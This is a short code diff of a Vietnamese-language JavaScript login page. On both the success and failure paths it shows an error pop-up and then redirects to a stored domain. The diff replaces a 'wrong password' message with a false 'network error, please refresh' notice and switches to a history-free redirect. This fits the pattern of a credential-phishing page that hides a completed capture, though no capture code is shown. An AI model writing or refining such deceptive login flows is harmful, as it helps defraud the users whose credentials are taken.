@@ -193,22 +193,22 @@ https://cdn.jsdelivr.net/npm/sweetalert2@11.12.2/dist/sweetalert2.all.min.js
               localStorage.setItem("loggedIn", "true");
               localStorage.setItem("redirectURL", redirectDomain);
               Swal.fire({
-                title: "Lỗi",
-                text: "Tài khoản hoặc mật khẩu sai, hãy nhập lại!",
+                title: "Tin nhắn",
+                text: "Lỗi mạng, vui lòng làm mới lại giao diện",
                 icon: "error",
                 confirmButtonText: "OK",
               }).then(() => {
-                window.location.href = redirectDomain;
+                window.location.replace(redirectDomain);
               });
               document.getElementById("btnLoginss").disabled = false;
             } else {
               Swal.fire({
-                title: "Lỗi!",
-                text: "Tài khoản hoặc mật khẩu sai, hãy nhập lại!",
+                title: "Tin nhắn",
+                text: "Lỗi mạng, vui lòng làm mới lại giao diện",
                 icon: "error",
                 confirmButtonText: "OK",
               }).then(() => {
-                window.location.href = redirectDomain;
+                window.location.replace(redirectDomain);
               });
             }
 
